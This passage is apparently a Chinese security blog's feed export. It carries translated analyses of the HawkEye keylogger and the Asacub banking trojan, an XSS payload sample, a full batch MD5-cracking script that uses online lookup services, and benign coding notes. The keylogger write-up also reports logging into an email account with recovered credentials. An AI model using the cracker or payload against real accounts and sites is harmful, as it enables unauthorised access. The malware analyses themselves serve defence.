<p><span style="color: #ff6600;">恢复邮件设置和密码</span></p>

<p><span style="color: #ff6600;">恢复浏览器和FTP密码</span></p>

<p>正如前面笔者提到的，这款键盘记录器是由.net编译的。所以，笔者接下来需要反编译这个可执行文件。笔者使用了一个开源的.net反编译工具<a href="https://github.com/icsharpcode/ILSpy">ILSpy</a>来完成这个任务。</p>

<p>笔者反编译出了源代码，并将其与官网的特性列表进行比较，结果表明是完全符合的。笔者发现其代码有以下的特点：</p>

<p>一个剪贴板记录器</p>

<p>一个浏览器，FTP和邮件客户端密码记录器。它也会去尝试窃取密码管理器证书和windows密钥。</p>

<p>蠕虫类的USB感染程序，可以让记录器感染扩散到其他windows机器。</p>

<p>它也针对一些Steam游戏平台的用户，通过删除配置和登录数据文件，用户会强制再次登录。这就给了键盘记录器窃取用户Steam认证的可乘之机。</p>

<p>窃取的信息里包括桌面截图，它们会被发送到黑客的邮箱，或者键盘记录器里配好的FTP服务器上。</p>

<p>黑客貌似也会配置键盘记录器，通过HTTP将窃取的信息上传到PHP服务器上。但是奇怪的是，这里的代码留空了。</p>

<p>笔者在反编译时，发现最有趣的是一个C#的构造函数Form1()。这是键盘记录器储存配置的地方，但是为了确保黑客电子邮件地址和FTP登录凭证的安全，它们使用了Rijndael算法和Base64加密。</p>

<p>但是我们知道，这些加密的数据并不一定安全，特别是解密的部分写在了笔者能够反编译的代码里。</p>

<p>下面这张图是Decrypt（解密）方法，它会接收两个字符串参数：encryptedBytes和secretKey。这个安全密钥恰好是硬编码字符串HawkSpySoftwares。</p>

<p>正如提到的那样，该键盘记录器使用了Rijndael算法，安全密钥用了Unicode字符串“099u787978786”进行加盐，也是硬编码。</p>

<p>处于好奇，笔者复制了这部分代码，简单修改适应后，在MS Visual Studio里面去进行编译。当然，最后笔者应该是解密成功了（待验证）。</p>

<p>最后，笔者拿着邮箱认证信息去登陆尝试。</p>

<p>这些似乎是感染系统上的电子邮件地址。所以笔者检查了邮件设置，结果发现了意外之喜！发送到这个邮箱的电子邮件会自动转发到黑客的Gmail账户里。你可以在下面截图里看到黑客的Gmail地址。</p>

<p>也许黑客知道HawkEye容易被破解，所以为了保护他们自己的电子邮件认证信息，就劫持了一个无辜的电子邮件账户作为初始的接收器，最后它会把收到的内容统统转给黑客的真实电子邮件地址。</p>

<p>最终，笔者把受害的电子邮件帐户还给了失主，并为他们修改了密码，移除了黑客的电子邮件重定向设置。</p>

<p>如文中所写的，笔者也收到了包含CVE-2012-0158的exp附件，里面是同一款键盘记录器，但是却配置了另一个电子邮箱账户作为窃取数据的初始接收邮箱。</p>

<p>攻击中的这两个漏洞虽然已经比较早了，但是仍广泛用于电子邮件攻击之中，这里建议读者更新好补丁，使用好相应的杀软，从而防御黑客的攻击。</p>

<p><span style="color: #ff0000;"><strong>[参考来源<a style="color: #ff0000;" href="https://www.trustwave.com/Resources/SpiderLabs-Blog/How-I-Cracked-a-Keylogger-and-Ended-Up-in-Someone-s-Inbox/" target="_blank">trustwave</a>，转载请注明本站翻译]</strong></span></p>
]]></content>
      <categories>
        
          <category> translate </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Asacub：从间谍软件到银行木马]]></title>
      <url>/translate/2016/01/25/asacub-ef-bc-9a-e4-bb-8e-e9-97-b4-e8-b0-8d-e8-bd-af-e4-bb-b6-e5-88-b0-e9-93-b6-e8-a1-8c-e6-9c-a8-e9-a9-ac/</url>
      <content type="html"><![CDATA[<p><span style="color: #00B050;"><strong>我们最近分析了一个系列银行木马Trojan-Banker.AndroidOS.Asacub，发现了其中在用的一台CC服务器chugumshimusona.com，也在为一款名为CoreBot的Windows木马所使用,这让我们起了对这款移动端银行木马进行分析的心思。</strong></span></p>

<!--more-->
<p>据我们所知，最初版本的Asacub木马出现在2015年6月。与其说当时的Asacub是银行恶意软件，不如说它是一款木马。早期的Asacub会窃取用户收到的所有短信，并上传到黑客的服务器。这款木马能够从CC服务器接收和处理下面的命令：
<span style="color: #ffcc99;">get_history: 将浏览器历史上传到服务器上。</span>
<span style="color: #ffcc99;"> get_contacts: 将联系人列表上传到服务器上。</span>
<span style="color: #ffcc99;"> get_listapp: 将安装的应用列表上传到服务器上。</span>
<span style="color: #ffcc99;"> block_phone: 锁屏。</span>
<span style="color: #ffcc99;"> send_sms: 发送带有指定内容的短信到指定号码。</span>
而新版本的Asacub出现在2015年7月，这款恶意软件在接口使用了欧洲银行的logo，取代了早期版本的美国银行的logo。
与此同时，它可以执行的命令数量也有了很大的增长：
<span style="color: #ffcc99;">get_sms: 将所有短信上传到服务器上。</span>
<span style="color: #ffcc99;"> del_sms: 删掉指定的短信。</span>
<span style="color: #ffcc99;"> set_time: 为CC服务器的联系设定新的时间间隔。</span>
<span style="color: #ffcc99;"> get_time: 指定CC目标与CC服务器联系的时间间隔。</span>
<span style="color: #ffcc99;"> mute_vol: 静默电话模式。</span>
<span style="color: #ffcc99;"> start_alarm: 启用设备白屏处理器继续运行模式。</span>
<span style="color: #ffcc99;"> stop_alarm: 禁用设备白屏处理器继续运行模式。</span>
<span style="color: #ffcc99;"> block_phone: 锁屏。</span>
<span style="color: #ffcc99;"> rev_shell: 反弹shell执行命令。</span>
<span style="color: #ffcc99;"> intercept_start: 启用短信拦截。</span>
<span style="color: #ffcc99;"> intercept_stop: 关闭短信拦截。</span>
上述的远程命令执行（反弹shell）功能，其实对这类恶意软件的来讲是不太正常的。在接收到命令后，木马会主动将远程服务器接入肉鸡设备的控制台，以便黑客在设备上执行命令和获取输出的结果。这个功能是典型的后门功能，我们其实很少发现银行类恶意软件会使用它。因为大多数银行类恶意软件，旨在从受害者银行账户里窃取资金，而不是控制设备本身。
最新版本的Asacub出现在2015年9月之后，这里的功能比起早期版本来更加关注窃取银行的敏感信息。早期版本只是使用了银行的logo图标，新版本中我们则发现了一些带着银行logo的钓鱼页面：</p>

<p><img class="alignnone" src="https://cdn.securelist.com/files/2016/01/blog_corebot_1nn-768x698.jpg" alt="" width="768" height="698" /></p>

<p>该木马名叫“ActivityVTB24”。这听起来似乎是一家俄罗斯的大型银行，但是其却自称为乌克兰银行。</p>

<p><img class="alignnone" src="https://cdn.securelist.com/files/2015/12/blog_corebot_2-768x683.jpg" alt="" width="768" height="683" />
自去年9月Asacub改版以来，钓鱼窗口出现在所有变种之中，但是其中只有银行卡的输入框可用。这意味着黑客可能只攻击他们所使用银行的客户，当然也可能这只是其中一个版本。
在启动后，“秋日版本（autumnal version）”的木马就开始窃取短信，并且还能执行下面的命令：
<span style="color: #ffcc99;">get_history: 上传浏览器历史记录到服务器上。</span>
<span style="color: #ffcc99;"> get_contacts: 上传联系人列表到服务器上。</span>
<span style="color: #ffcc99;"> get_cc: 弹出钓鱼窗口来窃取银行卡数据。</span>
<span style="color: #ffcc99;"> get_listapp: 上传已安装程序列表到服务器。</span>
<span style="color: #ffcc99;"> change_redir: 转发所有来电到指定手机号码。</span>
<span style="color: #ffcc99;"> block_phone: 锁屏。</span>
<span style="color: #ffcc99;"> send_ussd: 运行指定的USSD请求。</span>
<span style="color: #ffcc99;"> update:下载指定的文件并安装。</span>
<span style="color: #ffcc99;"> send_sms: 短信发送指定内容到指定号码。</span>
虽然目前我们并没有注意到有美国用户受到它的攻击，但是黑客对美国银行logo的使用应该是个危险的信号。该木马正在迅速发展，随时有新的特性可能会激活，然后添加进木马里。
<strong><span style="color: #ff0000;">今天的Asacub</span></strong>
2015年末，我们发现了一个新的Asacub，它增添了下面的命令：
<span style="color: #ffcc99;">GPS_track_current – 获取设备的坐标定位，发送给攻击者。</span>
<span style="color: #ffcc99;"> camera_shot – 使用设备的相机拍照。</span>
<span style="color: #ffcc99;"> network_protocol – 目前我们不知道它有任何用处，但应该在未来会和CC服务器产生交互。</span>
这些变种里没有钓鱼功能，但代码中涉及到了银行关键词。有意思的是，该木马一直试图关闭乌克兰银行的官方应用：
<img class="alignnone" src="https://cdn.securelist.com/files/2016/01/blog_corebot_3.png" alt="" width="838" height="207" />
此外，我们还分析了该木马和CC服务器的通信，它似乎对俄罗斯手机银行服务特别感兴趣，
在新年假期，新的改动在俄罗斯通过短信疯狂传播。短短一个星期内，从2015.12.28到2016.01.04，我们已发现6500名感染的用户，该木马由此跻身最活跃的恶意程序TOP5.。Asacub改版后发展的速度才有所减缓，我们将继续跟踪这类恶意软件。</p>

<p><strong>[参考来源<a href="https://securelist.com/blog/research/73211/the-asacub-trojan-from-spyware-to-banking-malware/" target="_blank">securelist</a>，转载请注明本站翻译]</strong></p>
]]></content>
      <categories>
        
          <category> translate </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[python字符编码处理]]></title>
      <url>/%E7%BC%96%E7%A8%8B%E4%B9%8B%E8%B7%AF/2015/08/04/python-e5-ad-97-e7-ac-a6-e7-bc-96-e7-a0-81-e5-a4-84-e7-90-86/</url>
      <content type="html"><![CDATA[<p><strong><span style="color: #00B050;">最近因业务需求在写爬虫时，遇到点编码的问题，加上以前曾被类似问题困扰过，特此记录一下。</span></strong>
由于开发和使用环境常在Linux和Win下切换，常遇到字符处理错误，总结一些问题如下：</p>

<p><span style="color: #ff0000;">1.如何中文匹配网页内容，而不会被各种编码扰乱</span></p>
<pre lang="python">s="编码"
rs=unicode(s, "utf8")
u'\u7f16\u7801'</pre>
<p>很简单普遍的做法，unicode编码能很好的转码中文，平时储存中文字符串时可以：</p>
<pre lang="python">x=u'编码'</pre>
<p>但是这有可能会报错，python在字符处理时忒蛋疼，怎么办？</p>
<pre lang="python">reload(sys)
sys.setdefaultencoding('utf-8')</pre>
<p>又是非常简单而万精油的两句代码，默认把文件编码设成utf-8，在这时光是在代码头部写上#coding=utf-8之类的是不太管用的。
<span style="color: #ff0000;">2.网上摘抄一段内容，也是自己遇到过的，关于把文字直接解码。</span></p>
<pre lang="python">Traceback (most recent call last):
File "ChineseTest.py", line 3, in 
print open("Test.txt").read().decode("utf-8")
UnicodeEncodeError: 'gbk' codec can't encode character u'\ufeff' in position 0: illegal multibyte sequence</pre>
<p>原来，某些软件，如notepad，在保存一个以UTF-8编码的文件时，会在文件开始的地方插入三个不可见的字符（0xEF 0xBB 0xBF，即BOM）。
因此我们在读取时需要自己去掉这些字符，python中的codecs module定义了这个常量：</p>
<pre lang="python"># coding=gbk
import codecs
data = open("Test.txt").read()
if data[:3] == codecs.BOM_UTF8:
data = data[3:]
print data.decode("utf-8")
结果：abc中文</pre>
<p><span style="color: #ff0000;">3.在Win下保存文件时，注意下保存文件的编码，鄙人一般选UTF8，默认的ANSI和UNICODE感觉不太好用。里面的内容换到Linux下容易报错。</span>
<span style="color: #ff0000;">4.编码和解码，这样的姿势也是可以的：</span></p>
<pre lang="python">x=r'\u7f16\u7801'
print x.decode("unicode_escape")
编码</pre>
<p><span style="color: #ff0000;">
5.话不多说看图，中文字符串的比较:</span></p>
<pre lang="python">'编码'.decode('utf-8') == u'编码'
True

'编码' == u'编码'
__main__:1: UnicodeWarning: Unicode equal comparison failed to convert both arguments to Unicode - interpreting them as being unequal
False

unicode('编码') == u'编码'
Traceback (most recent call last):
  File "", line 1, in 
UnicodeDecodeError: 'ascii' codec can't decode byte 0xe7 in position 0: ordinal not in range(128)</pre>
<p><span style="color: #ff0000;">6.附上一个链接，本文上述的问题里面多有讲述，但鄙人没有一一验证过，但确实很详细。</span>
<span style="color: #ff00ff;"><a title="Python、Unicode和中文" href="http://blog.csdn.net/summerhust/article/details/6654150" target="_blank"><span style="color: #ff00ff;">Python、Unicode和中文</span></a></span></p>

<p>文章是记录型，很简单的东西，不喜勿喷。
<span style="color: #00B050;">[转载请注明来源<a href="http://blog.hellsec.net" target="_blank"><span style="color: #00B050;">本站</span></a>,谢谢。]</span></p>
]]></content>
      <categories>
        
          <category> 编程之路 </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Ubuntu更新显卡驱动失败解决办法]]></title>
      <url>/system/2014/10/13/ubuntu-e6-9b-b4-e6-96-b0-e6-98-be-e5-8d-a1-e9-a9-b1-e5-8a-a8-e5-a4-b1-e8-b4-a5-e8-a7-a3-e5-86-b3-e5-8a-9e-e6-b3-95/</url>
      <content type="html"><![CDATA[<table>
  <tbody>
    <tr>
      <td>前段时间因为做项目，一直整夜整夜地挂机爬站，笔记本用成台式机的负荷也是醉了-_-</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>由此出现了一个问题，鄙人笔记本物理机装的Ubuntu13.04，在挂机或者待机一段时间不能恢复登录状态，一直黑屏。对于这种情况本屌只有一个劲儿的敲键盘试图唤醒，结果只能弹出一个纯命令行，切回图形界面后控制面板却没了。</p>

<p>于是乎，本屌在网上查了下，似乎是因为显卡驱动的原因，好嘛，那就更新显卡驱动，在Ubuntu软件更新器里面（图形化的）点了一个最新版的，兴冲冲地重启然后登陆，啪，尼玛，黑屏。。不死心再来一遍，还是那样，差点就泪奔了，这项目还没做完呢，一会儿搞半天没时间了咋办  T_T</p>

<p>找大牛求助，指点去Ubuntu社区翻了翻，找出一篇<span style="color: #ff0000;"><a href="http://forum.ubuntu.org.cn/viewtopic.php?t=217062" target="_blank"><span style="color: #ff0000;">帖子</span></a></span>，说是可以恢复模式切回原来的状态，重启看了下，似乎需要安装盘，我去，屌丝表示没准备Ubuntu的安装盘，这条果断Pass。</p>

<p>接着找到一篇<span style="color: #ff0000;"><a href="http://forum.ubuntu.org.cn/viewtopic.php?f=94&amp;t=140531" target="_blank"><span style="color: #ff0000;">帖子</span></a></span>，让本屌在错误日志里面，找到安装新显卡驱动时的报错，查了下并没有出错，估计只是不兼容？然后在安装日志里试图直接进行卸载，未果。</p>

<p>网上还有坑爹<span style="color: #00B050;"><a href="http://blog.csdn.net/crazyboy2009/article/details/8232158" target="_blank"><span style="color: #00B050;">教程</span></a></span>让直接卸载显卡驱动，然后后来就没后文了，尼玛，当本屌傻麽，直接卸载了不管依赖关系想重装系统麽，最好别酱紫做！</p>

<p>后来本屌的解决办法是通过<strong><span style="color: #ff00ff;"><a href="http://jishu.zol.com.cn/140483.html" target="_blank"><span style="color: #ff00ff;">更新软件列表源</span></a></span></strong>，搞一个叫Paa的玩意儿，将所有的包更新到了最新版本（还是13.x），然后才解决了。</p>

<p>附上：<span style="color: #ff00ff;"><strong>sudo apt-get dist-upgrade</strong></span>（里面的上两条其实不用）</p>

<p>顺便附上一个没有成功的<span style="color: #00B050;"><a href="http://forum.ubuntu.org.cn/viewtopic.php?f=42&amp;p=2973310" target="_blank"><span style="color: #00B050;">案例</span></a></span>，以及后来看到的一个复杂<span style="color: #00B050;"><a href="http://forum.ubuntu.org.cn/viewtopic.php?t=384333" target="_blank"><span style="color: #00B050;">例子</span></a></span>。</p>

<p>现在暂时用着笔记本还没出问题，如果再出现相应情况，打算试试这个<span style="color: #ff0000;"><a href="http://zhidao.baidu.com/link?url=rBeSSVPGK3lwAQVX3Rlj6oHY6_8bUiz-oY8CsIJAs4gTHg747YRiG8OVxSU21jS0GX7DqC4XVDO1EKlvBZViHK" target="_blank"><span style="color: #ff0000;">案例</span></a></span>，似乎是啥笔记本模式，看起来有点靠谱。其实最好的法子就是设置电源选项让它不挂起，不过在公司有闲杂人员出入，也只能将就了。</p>

<p><strong><span style="color: #00B050;">还有，大家没事不要乱更新卸载驱动之类的，坑爹的一B。。</span></strong></p>

<p>===================</p>

<p><strong><span style="color: #00B050;">Enjoy yourself！</span></strong></p>
]]></content>
      <categories>
        
          <category> system </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[对于python框架Scrapy+Gevent的研究]]></title>
      <url>/other/2014/09/20/e5-af-b9-e4-ba-8epython-e6-a1-86-e6-9e-b6scrapygevent-e7-9a-84-e7-a0-94-e7-a9-b6/</url>
      <content type="html"><![CDATA[<p><span style="color: #00ffff;"><strong>没错，标题党君又来了！文章只是做些第三方评论，不喜勿喷。</strong></span></p>

<p>前几天看到<span style="color: #ff0000;"><a title="Freebuf" href="http://www.freebuf.com/tools/43194.html" target="_blank"><span style="color: #ff0000;">FB上的一篇文章</span></a></span>，是将用Scrapy爬虫框架加以关键词词尝试，从而将可用的关键词与相应的URL返回存到结果里，个人感觉还是有比较大的改进空间的。覆盖攻击向量字段如下：</p>

<p>Http头中的Referer字段
User-Agent字段
Cookie
表单（包括隐藏表单）
URL参数
RUL末尾，如 www.example.com/&lt;script&gt;alert(1)&lt;/script&gt;
跳转型XSS</p>

<p>由于英文说明书的原作者说该Scrapy的XSS延伸版不能进行Ajax判断，还是有点小遗憾，希望日后改进。</p>

<p>感觉其提供的测试页面爬下来效果不错，我这儿没有图床可用，就不展示了。（<strong><span style="color: #00B050;">话说有朋友可以给鄙人一免费图床地址么，2333333</span></strong>）</p>

<p>附上该Git的地址：<a title="xsscrapy" href="https://github.com/DanMcInerney/xsscrapy" target="_blank"><span style="color: #ff0000;">下载</span></a>。</p>

<p>还有就是，本人测试用的是Ubuntu13.04，作者建议pip安装，鄙人使用自带的安装包pip，表示有不少问题，后来在网上下了一个<span style="color: #ff0000;"><a title="pip1.5" href="https://pypi.python.org/packages/source/p/pip/pip-1.5.4.tar.gz" target="_blank"><span style="color: #ff0000;">1.5版本</span></a></span>的才成功。此外，个人感觉apt-get安装确实挺给力，除了没有的包以外，基本很难报错（知道肯定有人吐槽这B说的不是废话么^_^，以前一个朋友就挺爱骂我SB，不过可惜再也没能见到他了）。</p>

<p>PS：里面所需的BeautifulSoup最好用BeautifulSoup3.2.1，BeautifulSoup4.x版本已改名为bs4，坑惨小弟了，半天没反应过来。其他的pip安装（如pybloom），也可apt-get安装（如py-requests）,最后，对付某<span style="color: #00B050;">error: command ‘x86_64-linux-gnu-gcc’ failed with exit status 1</span>错误时，<span style="color: #00B050;">sudo apt-get install python-twisted-web python2.7-dev</span>，可能会用的上。</p>

<p>Scrapy是个不错的爬虫框架，最近笔者自己打算好好研究一下，结合注入工具进行爬虫式扫描，感觉应该不错的样子。如果有朋友有兴趣，或者有现货，欢迎提出宝贵建议，不胜感激。</p>

<p>另外，前面提到的Gevent是一名访客告诉小弟的，查看了下，是Python的一个高并发框架（高级术语名为协程）。没记错的话，还是以前那位爱骂我SB的朋友告诉我的（小感伤一下），因为以前有做分布式监控的想法。以后考虑将其纳入做项目的计划范围。</p>

<p>本文很水，不过以后有心得会更新的，除非有单独料，我会单独提出。</p>

<p><span style="color: #00ffff;">Enjoy yourself.^_^</span></p>

<p> </p>

<p> </p>

<p> </p>
]]></content>
      <categories>
        
          <category> other </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Md5批量+多接口破解脚本]]></title>
      <url>/tools/2014/09/08/md5-e6-89-b9-e9-87-8f-e5-a4-9a-e6-8e-a5-e5-8f-a3-e7-a0-b4-e8-a7-a3-e8-84-9a-e6-9c-ac/</url>
      <content type="html"><![CDATA[<p>=~~~~~~~~~~~~~~~~~~~~<del>=
+———–DemonSpider—————-+
+-Code reset by demon@f4ck.net—-+
+———-<a title="blog.hellsec.net" href="http://blog.hellsec.net" target="_blank">blog.hellsec.net</a>————+
=</del>~~~~~~~~~~~~~~~~~~~~=
<span style="color: #ff0000;">PS:个人觉得这脚本最大的特点就是多接口+批量，当然，也可单选。</span>
代码预览如下：</p>
<pre lang="python">
# -*- coding=utf-8 -*-
import sys
import socket
import urllib
import re
import string
import urllib2
import threading
import HTMLParser
import cookielib

def showInfo():
    print """
     命令格式：md5_crack.py -hash md5hash \n
			or md5_crack.py -dic
           """

comcn_tmp=[]


class timer(threading.Thread): 
    def __init__(self, HASH):  
        threading.Thread.__init__(self)  
        self.HASH = HASH    
   
    def run(self):  
        try:
            if crack_md5asia(self.HASH):
                return True
        except Exception,e:
            print e
            pass
        
        try:
            if crack_cc(self.HASH):
                return True
        except Exception,e:
            print e
            pass
        
        try:
            if crack_silic(self.HASH):
                return True
        except Exception,e:
            print e
            pass
        
        try:
            if crack_comcn(self.HASH):
                return True
        except Exception,e:
            print e
            pass

        try:
            if crack_somd5(self.HASH):
                return True
        except Exception,e:
            print e
            pass
        
        print "[x]HASH Crack: "+self.HASH+" failed."
        f.writelines(HASH+'\n')
        return False 
              


class Parselinks(HTMLParser.HTMLParser):
    def handle_starttag(self,tag,attrs):
        if tag == 'input':
            for name,value in attrs:
                if name == 'name':
                    if value != 'sand':
                        continue
                    else:
                        count=0
                        for name,value in attrs:
                            count=count+1
                            if count == 3: 
                                comcn_tmp.append(value)

        if tag == 'input':
            for name,value in attrs:
                if name == 'name':
                    if value != 'token':
                        continue
                    else:
                        count=0
                        for name,value in attrs:
                            count=count+1
                            if count == 3: 
                                comcn_tmp.append(value)


#From http://www.md5.asia/
def crack_md5asia(Hash):   
    str_url=["http://md5ss.sinaapp.com/md5_decode.php?decoder=1&amp;timeout=10&amp;hash=",Hash]
    url="".join(str_url)
    #print url
            
    try:
        sock=urllib.urlopen(url)
        htmlSources=sock.read()
    except:
        #print "Not Found"
        return False
    else:
        sock.close()
    #本来这个地方，应该比较"未找到,"，但是由于编码的问题，会出问题。因此，改为16进制了。
    if string.find(htmlSources,"\346\234\252\346")!=-1:
        return False
        #print "Not Found2"
    else:
        print "Password Found:",htmlSources
        s.writelines(HASH+' '+resp+'\n')
        print 'asia:',resp
        return True
        #exit(1)


def crack_comcn(HASH):

    cj = cookielib.CookieJar();
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    urllib2.install_opener(opener)
    parsed = Parselinks()
    parsed.feed(urllib.urlopen('http://www.md5.com.cn').read())
    post_data = {'md': HASH ,'sand':comcn_tmp[0],'token':comcn_tmp[1],'submit':'MD5+Crack'}
    post_data_urlencode = urllib.urlencode(post_data)
    requrl = "http://www.md5.com.cn/md5reverse"
    req = urllib2.Request(url = requrl,data =post_data_urlencode)
    req.add_header('Referer', "http://www.md5.com.cn/")
    resps = urllib2.urlopen(req)
    match = re.findall('Result:.*green"&gt;.*&lt;\/span',resps.read())
    re_match=re.findall('green"&gt;.*&lt;\/span&gt;&lt;div',match[0])[0][7:-11]
    #print re_match[0][7:-11]
    s.writelines(HASH+' '+re_match+'\n')
    print 'comcn:',re_match
    return True



def crack_silic(HASH):
    post_data = {'isajax':'1' ,'md5':HASH}
    post_data_urlencode = urllib.urlencode(post_data)
    requrl = "http://cracker.blackbap.org/?do=search&amp;language=en"
    req = urllib2.Request(url = requrl,data =post_data_urlencode)
    res_data = urllib2.urlopen(req)
    res = res_data.read()
    #print res
    resp = re.findall('Password <strong>.*&lt;\/strong&gt;',res)[0][17:-9]
    #print resp
    s.writelines(HASH+' '+resp+'\n')
    print 'silic:',resp
    return True

def crack_cc(HASH):
    url='http://www.md5.cc/ShowMD5Info.asp?GetType=ShowInfo&amp;no-cache=0.4669540437658686&amp;md5_str='+HASH+'&amp;_='
    request = urllib2.Request(url)
    request.add_header('Referer', "http://www.md5.cc/")
    res=urllib2.urlopen(request).read()
    resp = re.findall('25px"&gt;.*&lt;\/span&gt;',res)[0][6:-7].strip()
    #print resp[6:-7].strip()
    s.writelines(HASH+' '+resp+'\n')
    print "cc:",resp
    return True

def crack_somd5(HASH):

    resp=urllib.urlopen('http://www.somd5.com/somd5-md5-js.html').read()
    ajax_data=re.findall('isajax=.*&amp;',resp)[0][7:-1]
    post_data = {'isajax':ajax_data,'md5':HASH}
    post_data_urlencode = urllib.urlencode(post_data)
    requrl = "http://www.somd5.com/somd5-index-md5.html"
    req = urllib2.Request(url = requrl,data =post_data_urlencode)
    resps = urllib2.urlopen(req).read()
    match = re.findall('&lt;h1.*line;"&gt;.*&lt;\/h1',resps)[0]
    re_match = re.findall('"&gt;.*&lt;/',match)[0][2:-2]
    s.writelines(HASH+' '+resp+'\n')
    print "somd5",resp
    return True


if '__main__' == __name__:         

#这个简单脚本借用了一哥们儿的框架，虽然改动不少，按理确实应该留下原先那个兄弟版权的。。
#可是我在论坛搜了半天都没搜到。。完全遗忘了原版在哪儿找的有木有！！
#要是这兄弟看到了可以跟小弟联系，不嫌弃的话我加上~	

    print """
     =~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
     +-----------DemonSpider-----------+
     +--------Md5-Cracker--V1.0--------+
     +----------blog.hellsec.net--------+
     +--md5_crack.py for single or dic-+
     ===================================
                    = =
                   == ==
                ===&lt;-|-&gt;===
                 ====D====
                  ===e===
                   ==m==
                    =o=
                     n
    """
    global f,s

    if len(sys.argv)&lt;2 :
         print "参数错误"
         showInfo()
         exit(1)
     
    cmds = ['-hash','-dic']
     
    s=open('success_result.txt','w+')
    f=open('fail_result.txt','w+')
    cmd = sys.argv[1]
    if len(sys.argv) == 3 :
        Hash=sys.argv[2]
         
		 
    if 0 == cmds.count(cmd):  
        print cmd
        print "参数错误"
        showInfo()
        exit(1)
    else:
        print 'Start working,Please waiting...'
        if cmd == '-hash':
            if len(Hash)==16 or len(Hash)==32:
                crack_thread = timer(Hash)
                crack_thread.start()
                #crack_thread.setDamon()
                crack_thread.join()
            else:
                print "Hash长度出错."
        elif cmd == 'dic':
            for line in open('hash.txt','r'):
                if len(line.strip())==16 or len(line.strip())==32:
                    crack_thread = timer(line.strip())
                    crack_thread.start()

                else:
                    continue
    s.close()
    f.close()
    print "Crack ending...."
&lt;/pre&gt;
接口共五个，经小弟自己测试还算合手。

用法：
python md5_cracker.py -hash md5hash
python md5_cracker.py -dic

字典文件：
hash.txt
成功结果文件：success_result.txt
失败结果文件：fail_result.txt

<span style="color: #00B050;">附件。。就懒得发了吧。。^m^</span>
</strong></pre>
]]></content>
      <categories>
        
          <category> tools </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[php采集器小记]]></title>
      <url>/coding/2014/06/29/php-e9-87-87-e9-9b-86-e5-99-a8-e5-b0-8f-e8-ae-b0/</url>
      <content type="html"><![CDATA[<p>好吧，本屌承认又在糊弄朋友们了，这个没啥特别的，就是记录下一次帮人弄个简单的小说采集器时遇到的一些小问题。</p>

<p> </p>

<p><span style="color: #ff6600;">第一，如何截取特定标签间的内容：</span></p>

<p>当然，用可（dou）爱（bi）的正则可以解决，在期间遇到一个有趣的地方，本来是直接匹配的标签对的正则内容，然后作为数组输出，</p>

<p>可惜越界包含了其他标签，事实证明了只要（.*?），保证不为空就行。但是在期间查了份资料，preg_quote将需要匹配的内容保持为转义状态，</p>

<p>也就是不用特地去加反斜杠之类的，但是鄙人尝试输出时，并未成功。</p>

<p> </p>

<p><span style="color: #ff6600;">第二，如何处理爬取乱码：</span></p>

<p>在爬取过程中，可能会出现乱码，我们需要在实际运用过程中，考虑是否定义网页编码，或者定义输出编码，抑或是输出时进行转换，参考资料如下：</p>

<p>http://www.cnblogs.com/amboyna/archive/2008/04/21/1163116.html  php链接数据库编码问题</p>

<p><span>header(“Content-Type: text/html;charset=utf-8”);   网页头部加入可解决部分乱码</span></p>

<p><span>http://cn2.php.net/manual/en/function.mb-convert-encoding.php  php各种编码函数转换</span></p>

<p>。。。 这条我忘了0rz…</p>

<p> </p>

<p><span style="color: #ff6600;">第三，如何处理数据量大带来的边界溢出：</span></p>

<p>其实这点问题我没解决，网上找了个方法好像很屌的样子，不过我这里没成功，即在php.ini里修改，</p>

<p>加上pcre.backtrack_limit=-1，然后preg_replace,preg_match_all，此类的边界问题可能会得到解决。</p>

<p> </p>

<p><span style="color: #ff6600;">第四，如何清除文中空格，标点，以及标签：</span></p>

<p>标签清除可用strips_tag，简单粗暴。至于空格标签？试着preg_replace和str_replace，前者需要正则，后者直接替换的字符串。</p>

<p>在此期间需要注意，不可见及不能识别文字可通过编码，如urldecode进行具象化，然后将其替换再decode。如：http://zhidao.baidu.com/link?url=Ppil4x5ruvZ8mZX2w20jOJN-X_ZjwelCDVtjtGZ5ra_QD4Wq5ckIP4SOxAP3g7qDk9S-C3jcpSzXF9VHim-iZq</p>

<p>还有很重要的一点，不同编码的脚本，里面的规则如正则里的符号是不一样的，需要特别转换一下文件属性。PS:\s可代表空格tab一类。</p>

<p> </p>

<p><span style="color: #ff6600;">第五，如何采集文章的中文并且随机取出关键词：</span></p>

<p>UTF-8：</p>

<p>用mb_substr($str, 0, 100, ‘utf-8’) 或者mb_strcut($str, 0, 120, ‘utf-8’);
第一个方法是截取100个字，不是100个字节，utf-8编码 第二个方法是100个字节
这两个方法都不会乱码的
先产生随机数字，在根据随机数字调用上面的方法，注意，加了utf-8可能会造成数据取不到，鄙人并未找出原因，猜测是取到的正好为过滤掉的乱码字符。</p>

<p>GBK:</p>

<p>chr(rand(161,215)).chr(rand(161,249))，utf8的是三位。</p>

<p>使用时请注意函数mb_strlen，mt_rand（用于随机）。</p>

<p> </p>

<p><span style="color: #ffff00;">最后，附上两个带感的文献：</span></p>

<p>http://www.jb51.net/article/30024.htm  PHP压缩html网页代码</p>

<p>http://bbs.chinaunix.net/thread-3567100-1-1.html  php中如何截取中文字符串</p>

<p> </p>

<p> </p>

<p> </p>
]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[关于python和php数据库连接问题]]></title>
      <url>/data/2014/05/17/e5-85-b3-e4-ba-8epython-e5-92-8cphp-e6-95-b0-e6-8d-ae-e5-ba-93-e8-bf-9e-e6-8e-a5-e9-97-ae-e9-a2-98/</url>
      <content type="html"><![CDATA[<p>在几天的对完结项目的修正中，涉及到一些对python和php数据库的连接问题的处理。
在其中有关于系统方面的，也有库相关的，在这里做一个小小的总结。</p>

<p><span style="color: #ff0000;">1.python数据库连接</span>
mysql：import MySQLdb
